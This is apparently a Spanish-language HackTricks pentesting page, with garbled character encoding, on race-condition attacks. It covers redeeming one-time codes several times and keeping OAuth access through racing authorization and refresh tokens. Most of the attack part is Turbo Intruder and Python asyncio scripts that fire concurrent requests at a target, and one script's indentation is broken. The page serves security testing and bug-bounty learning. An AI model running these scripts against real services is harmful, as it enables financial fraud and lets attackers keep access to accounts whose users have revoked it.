# CondiciÃ³n de carrera

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas de la comunidad **mÃ¡s avanzadas del mundo**.\
Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabaja en una **empresa de ciberseguridad**? Â¿Quiere ver su **empresa anunciada en HackTricks**? Â¿O quiere tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulte los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnase al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­game** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Cualquier cosa limitada por un nÃºmero de intentos

Las condiciones de carrera son **vulnerabilidades** que **aparecen** en sitios web que **limitan el nÃºmero de veces que se puede realizar una acciÃ³n**. Un ejemplo muy sencillo se puede encontrar en [**este informe**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43).

## Usando varias veces un cÃ³digo de un solo uso

Cuando haces que la pÃ¡gina web realice alguna **acciÃ³n** que **debe hacerse solo una vez**, pero si la acciÃ³n se realiza **varias veces** se obtiene un **beneficio**, realmente necesitas probar una **condiciÃ³n de carrera**.\
La mayorÃ­a de las veces esto estÃ¡ directamente relacionado con el **dinero** (si se realiza una acciÃ³n, se obtiene X dinero, asÃ­ que intentemos hacerlo varias veces muy rÃ¡pidamente)**.**

### **Usando desde la misma cuenta el mismo cÃ³digo varias veces**

Por ejemplo, en [**este error**](https://hackerone.com/reports/759247) el cazador pudo **cargar el dinero dentro de una tarjeta de regalo varias veces.**

Este es el script **turbo intruder** utilizado para **probar** la **condiciÃ³n de carrera** del informe mencionado:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
    engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')


    engine.start(timeout=5)
   engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
Usando tambiÃ©n BURP, puedes enviar la **peticiÃ³n** a **Intruder**, establecer el **nÃºmero de hilos** en **30** dentro del menÃº de **Opciones** y seleccionar como carga Ãºtil **Cargas Ãºtiles nulas** y generar **30**.

### **Usando el mismo cÃ³digo desde diferentes cuentas**

**Si la propuesta anterior no funcionÃ³ (intentando usar el mismo cÃ³digo varias veces desde la misma cuenta), puedes probar una variante: Intenta usar el mismo cÃ³digo desde diferentes cuentas:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
    for i in range(len(a)):
        engine.queue(target.req,a[i], gate='race1')
    # open TCP connections and send partial requests
    engine.start(timeout=10)
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```
### Usando Python
```python
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20): #20 times
            tasks.append(asyncio.ensure_future(use_code(client)))
        
        # Get responses
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print results
        for r in results:
            print(r)
        
        # Async2sync sleep
        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())
```
## Persistencia eterna de OAuth2

Existen varios [**proveedores de OAuth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Estos servicios te permiten crear una aplicaciÃ³n y autenticar a los usuarios que el proveedor ha registrado. Para hacerlo, el **cliente** necesitarÃ¡ **permitir que tu aplicaciÃ³n** acceda a algunos de sus datos dentro del **proveedor de OAuth**.\
Hasta aquÃ­, solo es un inicio de sesiÃ³n comÃºn con Google/LinkedIn/GitHub... donde se te muestra una pÃ¡gina que dice: "_La aplicaciÃ³n \<InsertCoolName> quiere acceder a tu informaciÃ³n, Â¿quieres permitirlo?_"

#### CondiciÃ³n de carrera en `authorization_code`

El **problema** aparece cuando **lo aceptas** y automÃ¡ticamente envÃ­a un **`authorization_code`** a la aplicaciÃ³n maliciosa. Entonces, esta **aplicaciÃ³n abusa de una condiciÃ³n de carrera en el proveedor de servicios de OAuth para generar mÃ¡s de un AT/RT** (_Authentication Token/Refresh Token_) a partir del **`authorization_code`** para tu cuenta. BÃ¡sicamente, abusarÃ¡ del hecho de que has aceptado que la aplicaciÃ³n acceda a tus datos para **crear varias cuentas**. Luego, si **dejas de permitir que la aplicaciÃ³n acceda a tus datos, un par de AT/RT se eliminarÃ¡, pero los demÃ¡s seguirÃ¡n siendo vÃ¡lidos**.

#### CondiciÃ³n de carrera en `Refresh Token`

Una vez que **has obtenido un RT vÃ¡lido**, podrÃ­as intentar **abusar de Ã©l para generar varios AT/RT** e incluso si el usuario cancela los permisos para que la aplicaciÃ³n maliciosa acceda a sus datos, **varios RT seguirÃ¡n siendo vÃ¡lidos.**

## Referencias

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fÃ¡cilmente con las herramientas de la comunidad mÃ¡s avanzadas del mundo.\
ObtÃ©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
